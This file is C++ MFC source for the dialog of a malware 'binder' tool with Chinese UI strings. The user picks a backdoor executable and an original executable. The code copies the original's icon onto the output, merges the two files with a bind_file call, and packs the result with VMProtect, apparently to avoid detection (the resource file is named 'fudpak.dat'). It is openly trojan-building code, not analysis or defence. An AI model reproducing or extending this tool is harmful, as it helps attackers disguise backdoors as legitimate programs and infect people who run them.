
// BinderUIDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "BinderUI.h"
#include "BinderUIDlg.h"
#include "afxdialogex.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// CBinderUIDlg 对话框
#include "OpenSave.h"
void vmp(LPCTSTR lpszFileName)
{
	TCHAR szCmd[MAX_PATH] = { 0 };
	_stprintf_s(szCmd, _T("VMProtect_Con.exe %s"), lpszFileName);
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	RtlZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	GetStartupInfo(&si);
	RtlZeroMemory(&pi, sizeof(pi));
	si.wShowWindow = SW_SHOW;
	// Start the child process.   
	if (CreateProcess(NULL,   // No module name (use command line)  
		(LPSTR)szCmd,        // Command line  
		NULL,           // Process handle not inheritable  
		NULL,           // Thread handle not inheritable  
		FALSE,          // Set handle inheritance to FALSE  
		0,              // No creation flags  
		NULL,           // Use parent's environment block  
		NULL,           // Use parent's starting directory   
		&si,            // Pointer to STARTUPINFO structure  
		&pi)
		)
	{

		WaitForSingleObject(pi.hProcess, INFINITE);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}
}

CBinderUIDlg::CBinderUIDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(IDD_BINDERUI_DIALOG, pParent),flags(0)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CBinderUIDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CBinderUIDlg, CDialogEx)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_BUTTON1, &CBinderUIDlg::OnBnClickedButton1)
	ON_BN_CLICKED(IDC_BUTTON3, &CBinderUIDlg::OnBnClickedButton3)
	ON_BN_CLICKED(IDC_BUTTON2, &CBinderUIDlg::OnBnClickedButton2)
END_MESSAGE_MAP()


// CBinderUIDlg 消息处理程序

BOOL CBinderUIDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	// TODO: 在此添加额外的初始化代码
	TCHAR szFileName[MAX_PATH] = { 0 };
	::GetModuleFileName(NULL, szFileName, MAX_PATH);
	*(_tcsrchr(szFileName, _T('\\')) + 1) = NULL;
	_tcsncpy(szDatFile, szFileName, MAX_PATH);
	_tcsncat(szDatFile, _T("fudpak.dat"), MAX_PATH);
	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。  对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CBinderUIDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CBinderUIDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}



void CBinderUIDlg::OnBnClickedButton1()
{
	// TODO: 在此添加控件通知处理程序代码
	DWORD dwRet = GetOpenName(GetModuleHandle(NULL), szSrcExeFile, TEXT("EXE (*.EXE)\0*.EXE\0"), TEXT("原始EXE文件"));
	if (dwRet)
	{
		//SetDlgItemText(IDC_ICONEXE, szIconExeFile);
		flags |= 2;
	}
}


void CBinderUIDlg::OnBnClickedButton3()
{
	// TODO: 在此添加控件通知处理程序代码
	if (flags!=3)
	{
		AfxMessageBox(_T("必须选好后门和原始文件"));
		return;
	}

	DWORD dwRet = GetSaveName(GetModuleHandle(NULL), szOutFile, TEXT("EXE (*.EXE)\0*.EXE\0"), TEXT("保存为?"));
	if(dwRet)
	{
		IconExchange(szSrcExeFile, szDatFile, szOutFile);
		auto rt = bind_file(szSrcExeFile, szBackDoorFile, szOutFile);
		if (rt)
		{
			vmp(szOutFile);
			AfxMessageBox(TEXT("捆绑成功"));
		}
		else
		{
			AfxMessageBox(TEXT("捆绑失败"));
		}
		CDialogEx::OnOK();
	}
}


void CBinderUIDlg::OnBnClickedButton2()
{
	// TODO: 在此添加控件通知处理程序代码
	DWORD dwRet = GetOpenName(GetModuleHandle(NULL), szBackDoorFile, TEXT("EXE (*.EXE)\0*.EXE\0"), TEXT("选择后门EXE文件"));
	if (dwRet)
	{
		//SetDlgItemText(IDC_ICONEXE, szIconExeFile);
		flags |= 1;
	}
}
